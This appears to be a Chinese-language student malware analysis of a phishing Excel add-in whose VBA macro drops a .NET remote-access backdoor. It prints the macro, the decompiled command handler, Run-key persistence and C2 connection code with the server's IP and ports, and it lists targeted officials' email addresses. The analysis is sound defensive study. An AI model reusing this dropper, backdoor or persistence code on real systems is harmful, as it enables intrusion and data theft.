+<img src=https://hackmd.io/_uploads/HkXNuwZT6.png alt=圖片><ol><li><p>Unusual execution from MS Office</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ C:<span style=color:#ae81ff>\U</span>sers<span style=color:#ae81ff>\a</span>dmin<span style=color:#ae81ff>\G</span>lhvadia<span style=color:#ae81ff>\h</span>braeiwas.exe
+</span></span></code></pre></div><p>不是很清楚這一個command line是怎麼來的，後來發現有一個VB script，從Any.Run中看不太出來他是怎麼執行的，所幸就直接在VM中安裝office來跟一下
+<img src=https://hackmd.io/_uploads/rylQFw-6a.png alt=圖片></p><p>其實一開始執行==Guidelines.xlam==時會詢問要不要啟動Macro，也就是這個時候如果啟動就會執行惡意的file→<code>"C:\Users\admin\Glhvadia\hbraeiwas.exe", vbNormalNoFocus</code></p></li><li><p>Analyze VBA
+一開始也不知道怎麼在Excel中看VBA code，也是根據<sup id=fnref:2><a href=#fn:2 class=footnote-ref role=doc-noteref>2</a></sup><sup id=fnref:3><a href=#fn:3 class=footnote-ref role=doc-noteref>3</a></sup>才知道，另外，由於是第一次碰到關於VBA的問題，所以有關於要從哪一個Module開始看也不是很清楚，不過還好他只有兩個Module，雖然我看不是很確定VBA的流程，但根據AI的解析可以略知一二
+<img src=https://hackmd.io/_uploads/HJa3-Kb6T.png alt=圖片></p><pre tabindex=0><code class="language-vb=" data-lang="vb=">Sub userothraLoadr()
+    Dim path_othra_file As String
+    Dim file_othra_name  As String
+    Dim fldr_othra_name  As Variant
+    Dim byt() As Byte
+    Dim ar1othra() As String
+
+
+    file_othra_name = &#34;hbraeiwas&#34;
+    fldr_othra_name = Environ$(&#34;USERPROFILE&#34;) &amp; &#34;\Glhvadia\&#34;
+
+    If Dir(fldr_othra_name, vbDirectory) = &#34;&#34; Then
+        MkDir (fldr_othra_name)
+    End If
+    path_othra_file = fldr_othra_name &amp; file_othra_name &amp; &#34;.e&#34;
+    If InStr(Application.OperatingSystem, &#34;6.02&#34;) &gt; 0 Or InStr(Application.OperatingSystem, &#34;6.03&#34;) &gt; 0 Then
+        ar1othra = Split(UserForm1.TextBox2.Text, &#34;i&#34;)
+    Else
+        ar1othra = Split(UserForm1.TextBox1.Text, &#34;i&#34;)
+    End If
+    Dim btsothra() As Byte
+    Dim linothra As Double
+    linothra = 0
+    For Each vl In ar1othra
+        ReDim Preserve btsothra(linothra)
+        btsothra(linothra) = CByte(vl)
+        linothra = linothra + 1
+    Next
+    Open path_othra_file &amp; &#34;xe&#34; For Binary Access Write As #3
+         Put #3, , btsothra
+    Close #3
+     Shell path_othra_file &amp; &#34;xe&#34;, vbNormalNoFocus
+End Sub
+</code></pre><p>這個script簡單來說就是在做malware payload的extract，原本作者把惡意的payload scramble之後，當victim同意啟動Macro，他會再unscramble，可以看到下圖，他會依照不同的Application Version，選擇要用哪一個scramble payload接著把這些bits轉成bytes後寫到某一個檔案中，並且用shell執行該檔案，以上這些操作都極其詭異，另外他把檔案寫在</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-vb data-lang=vb><span style=display:flex><span>Environ<span style=color:#960050;background-color:#1e0010>$</span>(<span style=color:#e6db74>&#34;USERPROFILE&#34;</span>) <span style=color:#f92672>&amp;</span> <span style=color:#e6db74>&#34;\Glhvadia\hbraeiwas&#34;</span>
+</span></span></code></pre></div><p>:::danger
+這一段是錯的，他看的版本是OS的版本號，來決定要用哪一隻Payload，因為這和後面.NET的版很也有關係
+:::
+<img src=https://hackmd.io/_uploads/r1H_RTzp6.png alt=image>
+實際去看也的確是在這邊
+<img src=https://hackmd.io/_uploads/H1RAlCza6.png alt=image></p></li><li><p>Anaylize hbraeiwas.exe
+根據DIE的解析，這是一個用.NET寫的script，我之前碰到.NET的例子不多，唯一有碰過的reverse經驗是來自<a href=https://hackmd.io/@SBK6401/HkIYEw8Kh>臺大計安的welcome題-Nine & Nine-Revenge</a>
+<img src=https://hackmd.io/_uploads/HkBm8RfTT.png alt=image>
+一開始並不知道要先看哪裡，所以看了一些<code>.NET</code> reversing的文章，發現可以先從自定義的module開始看，也就是<code>hbraeiwas</code>這個class，如下圖
+<img src=https://hackmd.io/_uploads/H1M0HJQpp.png alt=image>
+透過copilot的解析可以很方便的看出這個程式的主要功能是解壓縮一個 ZIP 檔案並啟動其中包含的應用程式。這種行為常見於一些惡意軟體中，因為它可以用於自解壓縮並執行惡意程式碼，如果直接用動態debugger，就會更清楚他把東西unzip到哪邊去，他是decompress到<code>C:\ProgramData\Hdlharas\dlrarhsiva.exe</code>，並且實際執行
+<img src=https://hackmd.io/_uploads/HkWmWeXTa.png alt=image>
+再詳細說明一下，他先instantiate Class1，並且把裡面的內容丟到<code>dlrarhsiva.exe</code>，再執行，所以如果不想要分析其他有的沒得東西，可以直接看<code>Resources\dlrarhsiva7</code>這個執行檔
+<img src=https://hackmd.io/_uploads/HyMWUxmaa.png alt=image>
+:::spoiler</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-csharp data-lang=csharp><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>void</span> UnZip()
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>try</span>
+</span></span><span style=display:flex><span>    {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>string</span> apppath = <span style=color:#66d9ef>this</span>.get_apppath();
+</span></span><span style=display:flex><span>        Class1 @class = <span style=color:#66d9ef>new</span> Class1();
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>byte</span>[] wind = @class.getWind();
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>bool</span> flag = !Directory.Exists(apppath);
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (flag)
+</span></span><span style=display:flex><span>        {
+</span></span><span style=display:flex><span>            Directory.CreateDirectory(apppath);
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>string</span> text = apppath + <span style=color:#66d9ef>this</span>.appName;
+</span></span><span style=display:flex><span>        File.WriteAllBytes(text, wind);
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>string</span> text2 = apppath + <span style=color:#e6db74>&#34;mdkhm.zip&#34;</span>;
+</span></span><span style=display:flex><span>        flag = !File.Exists(text2);
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (flag)
+</span></span><span style=display:flex><span>        {
+</span></span><span style=display:flex><span>            File.Move(text, text2);
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>string</span> text3 = text + <span style=color:#e6db74>&#34;.exe&#34;</span>.ToString();
+</span></span><span style=display:flex><span>        flag = !File.Exists(text3);
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (flag)
+</span></span><span style=display:flex><span>        {
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>object</span> objectValue = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(<span style=color:#66d9ef>this</span>.shObj, <span style=color:#66d9ef>null</span>, <span style=color:#e6db74>&#34;NameSpace&#34;</span>, <span style=color:#66d9ef>new</span> <span style=color:#66d9ef>object</span>[]
+</span></span><span style=display:flex><span>            {
+</span></span><span style=display:flex><span>                apppath
+</span></span><span style=display:flex><span>            }, <span style=color:#66d9ef>null</span>, <span style=color:#66d9ef>null</span>, <span style=color:#66d9ef>null</span>));
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>object</span> objectValue2 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(<span style=color:#66d9ef>this</span>.shObj, <span style=color:#66d9ef>null</span>, <span style=color:#e6db74>&#34;NameSpace&#34;</span>, <span style=color:#66d9ef>new</span> <span style=color:#66d9ef>object</span>[]
+</span></span><span style=display:flex><span>            {
+</span></span><span style=display:flex><span>                text2
+</span></span><span style=display:flex><span>            }, <span style=color:#66d9ef>null</span>, <span style=color:#66d9ef>null</span>, <span style=color:#66d9ef>null</span>));
+</span></span><span style=display:flex><span>            NewLateBinding.LateCall(objectValue, <span style=color:#66d9ef>null</span>, <span style=color:#e6db74>&#34;CopyHere&#34;</span>, <span style=color:#66d9ef>new</span> <span style=color:#66d9ef>object</span>[]
+</span></span><span style=display:flex><span>            {
+</span></span><span style=display:flex><span>                RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue2, <span style=color:#66d9ef>null</span>, <span style=color:#e6db74>&#34;Items&#34;</span>, <span style=color:#66d9ef>new</span> <span style=color:#66d9ef>object</span>[<span style=color:#ae81ff>0</span>], <span style=color:#66d9ef>null</span>, <span style=color:#66d9ef>null</span>, <span style=color:#66d9ef>null</span>)),
+</span></span><span style=display:flex><span>                <span style=color:#ae81ff>4</span>
+</span></span><span style=display:flex><span>            }, <span style=color:#66d9ef>null</span>, <span style=color:#66d9ef>null</span>, <span style=color:#66d9ef>null</span>, <span style=color:#66d9ef>true</span>);
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>        Process.Start(text3);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>catch</span> (Exception ex)
+</span></span><span style=display:flex><span>    {
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>:::</p></li><li><p>Anaylize dlrarhsiva.exe
+根據DIE發現這也是一個.NET寫的PE file
+<img src=https://hackmd.io/_uploads/S1mWzgXpa.png alt=image>
+而且會發現module多了很多，實際進去看會發現應該是實際與C2 server連線和實作指令的地方，也就是後門的指令都在這邊
+<img src=https://hackmd.io/_uploads/BJ1jV-mTT.png alt=image>
+至於有哪一些操作，詳細可以看後門功能的section</p></li></ol></li></ol><h3 id=通訊協定>通訊協定
+<a class=anchor href=#%e9%80%9a%e8%a8%8a%e5%8d%94%e5%ae%9a>#</a></h3><p>我是直接把any.run的pcap download下來看有哪些東西</p><pre tabindex=0><code>NBNS
+ARP
+ICMPv6
+LLMNR
+BROWSER
+DNS
+TCP
+DHCPv6
+MDNS
+STP
+</code></pre><p>其實最主要C2 server和victim的連線主要是TCP，不過因為C2 server貌似沒有在運作了，所以沒辦法連線，我只能大概用連線失敗的封包以及後門的code判斷，至由有沒有其他的連線方式就不是很確定
+<img src=https://hackmd.io/_uploads/HJlaEEQTa.png alt=image></p><h3 id=加解密演算法>加解密演算法
+<a class=anchor href=#%e5%8a%a0%e8%a7%a3%e5%af%86%e6%bc%94%e7%ae%97%e6%b3%95>#</a></h3><p>就我本身的理解，看不太出來哪邊有特別做到加解密的事情，每一個步驟幾乎都只是一般的unscramble或是decompress可以解釋的地方</p><h3 id=後門功能>後門功能
+<a class=anchor href=#%e5%be%8c%e9%96%80%e5%8a%9f%e8%83%bd>#</a></h3><ol><li><p>Screenshot→
+<code>dlrarhsiva/dlrarhsiva.cxc/dlrarhsiva/SLCLRNS/dlrarhsivascreen</code>
+<img src=https://hackmd.io/_uploads/HyBqS-XTp.png alt=image></p></li><li><p>Remove User→<code>dlrarhsiva/dlrarhsiva.cxc/dlrarhsiva/OLRDMR/dlrarhsivaremove_user</code>
+這一段我認為是想辦法把一些資料pull下來後，並且直接執行remove user的動作，所以實際跟進去==dlrarhsivapull_data==這個method，會發現的確如我所預測，只不過實作的方法是他先從server那一端看有多少的bytes需要pull，然後把該值轉成int後就直接pull資料
+:::spoiler dlrarhsivapull_data() Source Code</p><pre tabindex=0><code class=language-csharp! data-lang=csharp!>// dlrarhsiva.OLRDMR
+// Token: 0x06000036 RID: 54 RVA: 0x0000480C File Offset: 0x00002A0C
+public void dlrarhsivaremove_user()
+{
+    try
+    {
+        byte[] array = this.server.dlrarhsivapull_data();
+        if (array != null)
+        {
+            if (!File.Exists(DLAONIF.dlrarhsivaget_mpath() + DLAONIF.dlrarhsivaremvUser + &#34;.exe&#34;))
+            {
+                File.WriteAllBytes(DLAONIF.dlrarhsivaget_mpath() + DLAONIF.dlrarhsivaremvUser + &#34;.exe&#34;, array);
+                this.dlrarhsivado_process(DLAONIF.dlrarhsivaget_mpath() + DLAONIF.dlrarhsivaremvUser + &#34;.exe&#34;);
+            }
+        }
+    }
+    catch
+    {
+    }
+}
+</code></pre><p>:::</p></li><li><p>Fetch Victim&rsquo;s Info→<code>dlrarhsiva/dlrarhsiva.cxc/dlrarhsiva/MLRLEINF/dlrarhsivaInfo</code>
+從以下source code可以知道使用Info這個command可以得知victim的Username或是MachineName
+:::spoiler dlrarhsivaInfo() Source Code</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-csharp data-lang=csharp><span style=display:flex><span><span style=color:#75715e>// dlrarhsiva.MLRLEINF</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>// Token: 0x06000031 RID: 49 RVA: 0x0000472C File Offset: 0x0000292C</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>private</span> <span style=color:#66d9ef>void</span> dlrarhsivaInfo()
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>this</span>.dlrarhsivaapver = <span style=color:#e6db74>&#34;M.0.0.5|dlrarhsiva&#34;</span>.Split(<span style=color:#66d9ef>new</span> <span style=color:#66d9ef>char</span>[]
+</span></span><span style=display:flex><span>    {
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;|&#39;</span>
+</span></span><span style=display:flex><span>    })[<span style=color:#ae81ff>0</span>];
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>this</span>.dlrarhsivacname = Environment.MachineName;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>this</span>.dlrarhsivauname = Environment.UserName;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>this</span>.dlrarhsivauip = <span style=color:#e6db74>&#34;&#34;</span>;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>this</span>.dlrarhsivalancard = <span style=color:#e6db74>&#34;&#34;</span>;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>:::</p></li><li><p>Others
+由於攻擊者可以使用的command實在是太多了，所以就直接列出來看比較清楚
+<img src=https://hackmd.io/_uploads/Hyb8sb766.png alt=image>
+比較重要的是get_command這個method，這個就和前面提到的pull data那個差不多，只是他後面還會帶上command和argument，便於下一些指令</p><p>另外，<code>dlrarhsivaimage_info()</code>這個method主要是看指定的圖片的一些相關資訊並且把該檔案上傳到某個地方，除此之外，還可以做到刪除檔案、上傳檔案、儲存檔案、查看user資訊等等，所有的command可以查看<code>dlrarhsivasee_responce()</code>這個method，裡面有紀錄所有遇到不同的command會執行對應的method(共有25個，詳細source code如下)
+:::spoiler</p><pre tabindex=0><code class=language-csharp! data-lang=csharp!>// dlrarhsiva.MLREDM
+// Token: 0x06000018 RID: 24 RVA: 0x00002EB8 File Offset: 0x000010B8
+private void dlrarhsivasee_responce()
+{
+    if (!this.dlrarhsivaiswitch)
+    {
+        this.dlrarhsivaiswitch = true;
+        this.dlrarhsivanetStream = this.dlrarhsivaCMD.dlrarhsivaNS(this.dlrarhsivatcpsck);
+        this.dlrarhsivacapScreen = false;
+        while (this.dlrarhsivais_working)
+        {
+            MLREDM.&lt;&gt;c__DisplayClasse CS$&lt;&gt;8__locals1 = new MLREDM.&lt;&gt;c__DisplayClasse();
+            CS$&lt;&gt;8__locals1.&lt;&gt;4__this = this;
+            CS$&lt;&gt;8__locals1.switchType = this.dlrarhsivaget_command();
+            if (CS$&lt;&gt;8__locals1.switchType == null)
+            {
+                this.dlrarhsivais_working = false;
+                break;
+            }
+            this.dlrarhsivareqCnls = false;
+            string text = CS$&lt;&gt;8__locals1.switchType[0].ToLower();
+            if (text.Split(new char[]
+            {
+                &#39;-&#39;
+            }).Length &gt; 1)
+            {
+                text = &#34;dlrarhsiva-&#34; + text.Split(new char[]
+                {
+                    &#39;-&#39;
+                })[1];
+            }
+            else
+            {
+                text = &#34;dlrarhsiva-&#34; + text;
+            }
+            string text2 = text;
+            switch (text2)
+            {
+            case &#34;dlrarhsiva-procl&#34;:
+                this.dlrarhsivafunStarter = delegate()
+                {
+                    this.dlrarhsivalist_processes(&#34;procl&#34;);
+                };
+                this.dlrarhsivafunThread = new Thread(this.dlrarhsivafunStarter);
+                this.dlrarhsivafunThread.Start();
+                break;
+            case &#34;dlrarhsiva-getavs&#34;:
+                this.dlrarhsivafunStarter = delegate()
+                {
+                    this.dlrarhsivalist_processes(&#34;getavs&#34;);
+                };
+                this.dlrarhsivafunThread = new Thread(this.dlrarhsivafunStarter);
+                this.dlrarhsivafunThread.Start();
+                break;
+            case &#34;dlrarhsiva-thumb&#34;:
+                this.dlrarhsivaimage_info(CS$&lt;&gt;8__locals1.switchType[1]);
+                break;
+            case &#34;dlrarhsiva-putsrt&#34;:
+                this.dlrarhsivaload_app();
+                break;
+            case &#34;dlrarhsiva-filsz&#34;:
+                this.dlrarhsivafile_info(CS$&lt;&gt;8__locals1.switchType[1], false);
+                break;
+            case &#34;dlrarhsiva-rupth&#34;:
+                this.dlrarhsivapush_data(null, &#34;dlrarhsiva-appth=|dlrarhsiva&#34;.Split(new char[]
+                {
+                    &#39;|&#39;
+                })[0] + DLAONIF.dlrarhsivaget_mpath(), false);
+                break;
+            case &#34;dlrarhsiva-dowf&#34;:
+                this.dlrarhsivasaveFile(CS$&lt;&gt;8__locals1.switchType[1]);
+                break;
+            case &#34;dlrarhsiva-endpo&#34;:
+                try
+                {
+                    Process.GetProcessById((int)Convert.ToInt16(CS$&lt;&gt;8__locals1.switchType[1].Trim())).Kill();
+                }
+                catch
+                {
+                }
+                break;
+            case &#34;dlrarhsiva-scrsz&#34;:
+                this.dlrarhsivascreenSize(CS$&lt;&gt;8__locals1.switchType[1]);
+                break;
+            case &#34;dlrarhsiva-cscreen&#34;:
+                this.dlrarhsivasee_scren(CS$&lt;&gt;8__locals1.switchType[1]);
+                break;
+            case &#34;dlrarhsiva-dirs&#34;:
+                this.dlrarhsivafunThread = new Thread(new ThreadStart(this.dlrarhsivalistDrives));
+                this.dlrarhsivafunThread.Start();
+                break;
+            case &#34;dlrarhsiva-stops&#34;:
+                this.dlrarhsivacapScreen = false;
+                break;
+            case &#34;dlrarhsiva-scren&#34;:
+                this.dlrarhsivacapScreen = true;
+                this.dlrarhsivafunStarter = delegate()
+                {
+                    CS$&lt;&gt;8__locals1.&lt;&gt;4__this.dlrarhsivais_screen(CS$&lt;&gt;8__locals1.switchType[1]);
+                };
+                this.dlrarhsivafunThread = new Thread(this.dlrarhsivafunStarter);
+                this.dlrarhsivafunThread.Start();
+                break;
+            case &#34;dlrarhsiva-cnls&#34;:
+                this.dlrarhsivaautCnls = true;
+                this.dlrarhsivareqCnls = true;
+                this.dlrarhsivacapScreen = false;
+                break;
+            case &#34;dlrarhsiva-udlt&#34;:
+                this.dlrarhsivaCMD.dlrarhsivaremove_user();
+                break;
+            case &#34;dlrarhsiva-delt&#34;:
+                this.dlrarhsivaremove_file(CS$&lt;&gt;8__locals1.switchType[1]);
+                break;
+            case &#34;dlrarhsiva-afile&#34;:
+                this.dlrarhsivafunStarter = delegate()
+                {
+                    CS$&lt;&gt;8__locals1.&lt;&gt;4__this.dlrarhsivasend_auto(CS$&lt;&gt;8__locals1.switchType[1]);
+                };
+                this.dlrarhsivafunThread = new Thread(this.dlrarhsivafunStarter);
+                this.dlrarhsivafunThread.Start();
+                break;
+            case &#34;dlrarhsiva-listf&#34;:
+                this.dlrarhsivafunStarter = delegate()
+                {
+                    CS$&lt;&gt;8__locals1.&lt;&gt;4__this.dlrarhsivaHD.dlrarhsivalookFiles(CS$&lt;&gt;8__locals1.switchType[1]);
+                };
+                this.dlrarhsivafunThread = new Thread(this.dlrarhsivafunStarter);
+                this.dlrarhsivafunThread.Start();
+                break;
+            case &#34;dlrarhsiva-file&#34;:
+                this.dlrarhsivafunStarter = delegate()
+                {
+                    CS$&lt;&gt;8__locals1.&lt;&gt;4__this.dlrarhsivapush_file(CS$&lt;&gt;8__locals1.switchType[1]);
+                };
+                this.dlrarhsivafunThread = new Thread(this.dlrarhsivafunStarter);
+                this.dlrarhsivafunThread.Start();
+                break;
+            case &#34;dlrarhsiva-info&#34;:
+                this.dlrarhsivafunThread = new Thread(new ThreadStart(this.dlrarhsivauser_info));
+                this.dlrarhsivafunThread.Start();
+                break;
+            case &#34;dlrarhsiva-runf&#34;:
+                this.dlrarhsivaCMD.dlrarhsivado_process(CS$&lt;&gt;8__locals1.switchType[1].Split(new char[]
+                {
+                    &#39;&gt;&#39;
+                })[0]);
+                break;
+            case &#34;dlrarhsiva-fles&#34;:
+            {
+                string files = this.dlrarhsivaHD.dlrarhsivalookupFiles(CS$&lt;&gt;8__locals1.switchType[1]);
+                if (files != null)
+                {
+                    this.dlrarhsivafunStarter = delegate()
+                    {
+                        CS$&lt;&gt;8__locals1.&lt;&gt;4__this.dlrarhsivapush_data(null, &#34;dlrarhsiva-fles=|dlrarhsiva&#34;.Split(new char[]
+                        {
+                            &#39;|&#39;
+                        })[0] + files, false);
+                    };
+                    this.dlrarhsivafunThread = new Thread(this.dlrarhsivafunStarter);
+                    this.dlrarhsivafunThread.Start();
+                }
+                break;
+            }
+            case &#34;dlrarhsiva-dowr&#34;:
+                this.dlrarhsivasaveFile(CS$&lt;&gt;8__locals1.switchType[1]);
+                break;
+            case &#34;dlrarhsiva-fldr&#34;:
+            {
+                string Folders = this.dlrarhsivaHD.dlrarhsivacheckFolders(CS$&lt;&gt;8__locals1.switchType[1]);
+                if (Folders != null)
+                {
+                    this.dlrarhsivafunStarter = delegate()
+                    {
+                        CS$&lt;&gt;8__locals1.&lt;&gt;4__this.dlrarhsivapush_data(null, &#34;dlrarhsiva-fldr=|dlrarhsiva&#34;.Split(new char[]
+                        {
+                            &#39;|&#39;
+                        })[0] + Folders, false);
+                    };
+                    this.dlrarhsivafunThread = new Thread(this.dlrarhsivafunStarter);
+                    this.dlrarhsivafunThread.Start();
+                }
+                break;
+            }
+            }
+        }
+        this.dlrarhsivais_working = false;
+        this.dlrarhsivacapScreen = false;
+    }
+    this.dlrarhsivaiswitch = false;
+}
+</code></pre><p>:::</p></li></ol><h3 id=常駐方式>常駐方式
+<a class=anchor href=#%e5%b8%b8%e9%a7%90%e6%96%b9%e5%bc%8f>#</a></h3><ol><li>根據Any.Run的ATT&amp;CK Matrix以及我自己分析的結果，看到他使用timer這個方式當作persisten的手法，當do_start() method啟動之後，隔一段時間就會觸發連線，並且每隔一段時間就會重新檢查connection(雖然Any.Run沒有看出來)，所以我猜這個手法對應的<a href=https://attack.mitre.org/techniques/T1053/006/>ATT&amp;CK ID應該是T1053.006</a><pre tabindex=0><code class=language-csharp! data-lang=csharp!>public void dlrarhsivado_start()
+{
+    DLAONIF.dlrarhsivaport = DLAONIF.ports[0];
+    this.dlrarhsivaUPC = new MLRLEINF();
+    this.dlrarhsivaCMD = new OLRDMR(this);
+    this.dlrarhsivaHD.iserver = this;
+    this.dlrarhsivaHD.dlrarhsivamainPath = DLAONIF.dlrarhsivaget_mpath();
+    TimerCallback callback = new TimerCallback(this.dlrarhsivalookup_connect);
+    System.Threading.Timer dlrarhsivatimer = new System.Threading.Timer(callback, this.dlrarhsivaStateObj, 31280, 37420);
+    this.dlrarhsivaStateObj.dlrarhsivatimer = dlrarhsivatimer;
+}
+</code></pre></li><li>另外，無意間用Autorun發現他有把<code>Hdlharas\dlrarhsiva.exe</code>註冊到registry中，這也是常見的套路，以ATT&amp;CK的framework來說，應該是<a href=https://attack.mitre.org/techniques/T1547/001/>T1547.001</a>(Any.Run還是沒有看出來)，詳細的code如下
+<img src=https://hackmd.io/_uploads/rygmHumT6.png alt=圖片><pre tabindex=0><code class=language-csharp! data-lang=csharp!>public static void dlrarhsivaset_run(string app, string path)
+{
+    try
+    {
+        string name = &#34;SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run|dlrarhsiva&#34;.Split(new char[]
+        {
+            &#39;|&#39;
+        })[0];
+        RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(name, true);
+        string str = DLAONIF.dlrarhsivapc_id;
+        object value = registryKey.GetValue(str + app);
+        if (value == null)
+        {
+            registryKey.SetValue(str + app, path);
+        }
+        else if (value.ToString() != path)
+        {
+            registryKey.SetValue(str + app, path);
+        }
+    }
+    catch
+    {
+    }
+}
+</code></pre>這是在<code>DLAONIF</code>這個module中，主要會由<code>MLREDM/dlrarhsivaload_app</code>這個method呼叫到，對應倒的指令是==dlrarhsiva-putsrt==
+<img src=https://hackmd.io/_uploads/SJqMqdXa6.png alt=圖片></li></ol><h2 id=中繼站>中繼站
+<a class=anchor href=#%e4%b8%ad%e7%b9%bc%e7%ab%99>#</a></h2><h3 id=基本資訊>基本資訊
+<a class=anchor href=#%e5%9f%ba%e6%9c%ac%e8%b3%87%e8%a8%8a>#</a></h3><p>在前面提到的後門功能中有一個是專門處理網路連線的(<code>dlrarhsivaIPSConfig</code>)，這其實蠻有趣的，他不直接寫出連線的IP，反而是做了簡單的ascii轉換後才進行連線，如下所示</p><ol><li>MLREDM/dlrarhsivaIPSConfig()
+這一段主要是進行連線，但是在連線前會進行IP parsing和fetching port的動作(如下一段所示)<pre tabindex=0><code class=language-csharp! data-lang=csharp!>// dlrarhsiva.MLREDM
+// Token: 0x0600001A RID: 26 RVA: 0x0000365C File Offset: 0x0000185C
+private bool dlrarhsivaIPSConfig()
+{
+    bool result;
+    try
+    {
+        DLAONIF.dlrarhsivadefaultP = this.dlrarhsivaCMD.dlrarhsivaserverIPD();
+        this.dlrarhsivatcpsck = new TcpClient();
+        this.dlrarhsivatcpsck.Connect(DLAONIF.dlrarhsivadefaultP, DLAONIF.dlrarhsivaport);
+        result = true;
+    }
+    catch
+    {
+        this.dlrarhsivaports_switch();
+        result = false;
+    }
+    return result;
+}
+</code></pre></li><li>OLRDMR/dlrarhsivaserverIPD()
+這一段就是把DLAONIF.dlrarhsivavpsips轉換成UTF-8而已，原本是ascii的integer形式，轉換後就變成一般的ascii string，也就是==185.136.161.124==<pre tabindex=0><code class=language-csharp! data-lang=csharp!>using System;
+using System.Diagnostics;
+using System.IO;
+using System.Net.Sockets;
+using System.Text;
+
+namespace dlrarhsiva
+{
+    // Token: 0x02000009 RID: 9
+    internal class OLRDMR
+    {
+        ...
+        public string dlrarhsivaserverIPD()
+        {
+            return Encoding.UTF8.GetString(DLAONIF.dlrarhsivavpsips, 0, DLAONIF.dlrarhsivavpsips.Length);
+        }
+        ...
+        // Token: 0x0400003A RID: 58
+        public MLREDM server;
+    }
+}
+</code></pre></li><li>DLAONIF/
+也可以自行轉換下面的IP，另外他有好幾個Port，詳細的code可以參考MLREDM/dlrarhsivaports_switch()這個method，在default port 6128連不上去的時候可以自行切換預先設定好的port number<pre tabindex=0><code class=language-csharp! data-lang=csharp!>using System;
+using System.IO;
+using System.Windows.Forms;
+using Microsoft.Win32;
+
+namespace dlrarhsiva
+{
+    // Token: 0x02000002 RID: 2
+    internal static class DLAONIF
+    {
+        ...
+        public static int[] ports = new int[]
+        {
+            6128,
+            8761,
+            11614,
+            15822,
+            17443
+        };
+
+        // Token: 0x04000005 RID: 5
+        public static byte[] dlrarhsivavpsips = new byte[]
+        {
+            49,
+            56,
+            53,
+            46,
+            49,
+            51,
+            54,
+            46,
+            49,
+            54,
+            49,
+            46,
+            49,
+            50,
+            52
+        };
+
+        // Token: 0x0400000A RID: 10
+        public static string dlrarhsivaAppPath = &#34;&#34;;
+    }
+}
+</code></pre></li></ol><h3 id=關連資訊>關連資訊
+<a class=anchor href=#%e9%97%9c%e9%80%a3%e8%b3%87%e8%a8%8a>#</a></h3><p>我不是很確定關聯資訊想要的形式是什麼，所以我選擇參考<a href=https://ipwhoisinfo.com/ip/185.136.161.124>whois的結果</a>和<a href=https://www.virustotal.com/gui/file/0335de8eadbbd5dc7cbe92ef869bcea6f6596ac39a38680142c982ec6e97ecde/behavior>VirusTotal的結果</a>互相對照，這個IP是來自於法國的Strasbourg，是在德國與法國超邊界的地方</p><h2 id=威脅情資>威脅情資
+<a class=anchor href=#%e5%a8%81%e8%84%85%e6%83%85%e8%b3%87>#</a></h2><h3 id=攻擊者>攻擊者
+<a class=anchor href=#%e6%94%bb%e6%93%8a%e8%80%85>#</a></h3><p><code>Duty Staff Officer &lt;ram.ratan909@navy.gov.in></code>，我在OSINT的各個online tool都沒有找到相關的資訊，而且有些甚至還說這是valid，想一想也對，這個mail的format看起來是屬於政府單位，所以我猜可能是政府單位的某個AD account被拿下來，然後就發送這樣的訊息出去，成功率看起來也會比較高
+:::danger
+正確答案是攻擊者可以篡改mail文件中的寄送人和router資訊，所以要實際去裡面看寄送的IP，有可能這個就是該攻擊者的C2 Server，所以其實攻擊者沒有把AD account拿下來
+:::</p><h3 id=攻擊時間>攻擊時間
+<a class=anchor href=#%e6%94%bb%e6%93%8a%e6%99%82%e9%96%93>#</a></h3><p><code>Tue, 28 Apr 2020 10:50:41 +0530 (IST)</code></p><h3 id=受害者>受害者
+<a class=anchor href=#%e5%8f%97%e5%ae%b3%e8%80%85>#</a></h3><p>從郵件中的CC User來看，&ldquo;可能"的受害者有以下幾個</p><pre tabindex=0><code>&#34;Wg Cdr MA  JAFFER ALI&#34; &lt;jdwcdma@iaf.nic.in&gt;
+&#34;Wg Cdr PAWAN BENIWAL&#34; &lt;wanwal.26965@gov.in&gt;
+&#34;Wg Cdr Kundan Kumar&#34;&lt;challenger@nic.in&gt;
